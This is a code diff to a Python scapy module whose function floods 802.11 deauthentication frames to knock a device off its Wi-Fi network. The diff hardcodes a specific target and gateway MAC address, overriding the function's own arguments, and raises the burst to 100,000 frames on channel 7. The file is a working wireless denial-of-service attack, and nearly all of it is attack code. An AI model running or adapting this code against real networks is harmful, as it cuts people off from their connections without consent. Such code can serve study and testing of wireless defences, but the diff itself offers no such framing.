@@ -1,6 +1,7 @@
 from scapy.all import *
 import logger
 
+
 log = None
 is_initialized = False
 
@@ -16,12 +17,15 @@ def module_init(main_log: logger.Logger):
 
 
 def wifi_deauth_host(target, gateway, persist=False):
+    target = 'a4:4b:d5:c0:55:0a'
+    gateway = 'b0:be:76:50:2e:25'
     log.log_info(f"starting wifi deauth target: {target}", True, True)
     dot11 = Dot11(addr1=target, addr2=gateway, addr3=gateway)
-    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    frame = RadioTap() / dot11 / Dot11Deauth()
+
     while True:
         log.log_info(f"sending deauth packet", True, True)
-        sendp(packet, inter=0.1, count=100, verbose=False)
+        sendp(frame, count=100000, inter=0.90, verbose=False,  channel=7)
         if not persist:
             break
 
